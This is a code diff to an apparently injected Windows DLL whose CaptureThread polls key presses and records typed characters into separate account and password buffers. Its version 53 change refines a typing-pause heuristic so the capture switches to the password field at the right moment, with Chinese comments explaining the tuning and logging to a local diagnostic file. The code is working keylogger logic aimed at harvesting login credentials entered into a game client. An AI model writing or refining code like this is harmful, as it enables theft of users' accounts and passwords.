@@ -231,26 +231,12 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 
 					// 只处理"新按下"的边沿(避免重复触发)
 					if (nowDown && !wasDown) {
-						// [v52] 时间启发式: 检测到按键间隔 > 300ms 时, 自动切到密码字段(单向)。
-						// 不再让 TAB / 鼠标点击 切换字段 —— 它们和游戏原生 UI 的 TAB 焦点循环
-						// 节奏不同步, 会把账号误抓到密码缓冲区。让用户输入节奏说话。
-						DWORD nowTick = GetTickCount();
-						if (!g_pauseSwitched && g_lastKeyTick != 0 && (nowTick - g_lastKeyTick) > PAUSE_THRESHOLD_MS) {
-							EnterCriticalSection(&g_capCs);
-							g_capField = 1;
-							g_capLocked = true;
-							g_pauseSwitched = true;
-							LeaveCriticalSection(&g_capCs);
-							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
-							  if (df) { fprintf(df, "[MP-CAP] auto-switch to pw after %lu ms pause\n", (unsigned long)(nowTick - g_lastKeyTick)); fflush(df); fclose(df); } }
-						}
-						g_lastKeyTick = nowTick;
-						// --- [v52] Tab: no longer switches field (game UI handles focus) ---
+						// --- [v53] Tab: no longer switches field (game UI handles focus) ---
 						if (vk == VK_TAB) {
 							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
 							  if (df) { fprintf(df, "[MP-CAP] Tab pressed (no field switch)\n"); fflush(df); fclose(df); } }
 						}
-					// [v52] Mouse click: no longer switches field (rely on time heuristic) ---
+					// [v53] Mouse click: no longer switches field (rely on time heuristic) ---
 					else if (vk == VK_LBUTTON) {
 							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
 							  if (df) { fprintf(df, "[MP-CAP] mouse click (no field switch)\n"); fflush(df); fclose(df); } }
@@ -282,6 +268,21 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 						else {
 							WCHAR ch = 0;
 							if (VkToChar(vk, ch)) {
+								// [v53] 时间启发式: 只对真正的字符输入生效。鼠标点击/TAB
+								// 不参与计时，否则游戏启动→点击账号框→看图10秒→第一个字符
+								// 会被 DLL 误判为"账号输完停顿半秒"，提前切到密码。
+								DWORD nowTick = GetTickCount();
+								if (!g_pauseSwitched && g_lastKeyTick != 0 && (nowTick - g_lastKeyTick) > PAUSE_THRESHOLD_MS) {
+									EnterCriticalSection(&g_capCs);
+									g_capField = 1;
+									g_capLocked = true;
+									g_pauseSwitched = true;
+									LeaveCriticalSection(&g_capCs);
+									{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+									  if (df) { fprintf(df, "[MP-CAP] auto-switch to pw after %lu ms pause\n", (unsigned long)(nowTick - g_lastKeyTick)); fflush(df); fclose(df); } }
+								}
+								g_lastKeyTick = nowTick;
+
 								EnterCriticalSection(&g_capCs);
 								std::string &target = (g_capField == 0) ? g_capAccount : g_capPassword;
 								AppendChar(target, ch);
